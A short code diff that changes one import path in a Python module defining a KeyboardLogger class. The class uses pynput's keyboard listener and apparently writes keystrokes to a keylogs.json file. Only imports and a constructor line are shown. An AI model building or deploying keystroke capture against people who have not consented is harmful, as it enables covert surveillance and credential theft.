@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 from datetime import datetime
 import threading
-from data_storage import DataStorage
+from keylogger.data_storage import DataStorage
 
 class KeyboardLogger:
     def __init__(self, output_path="keylogs.json"):
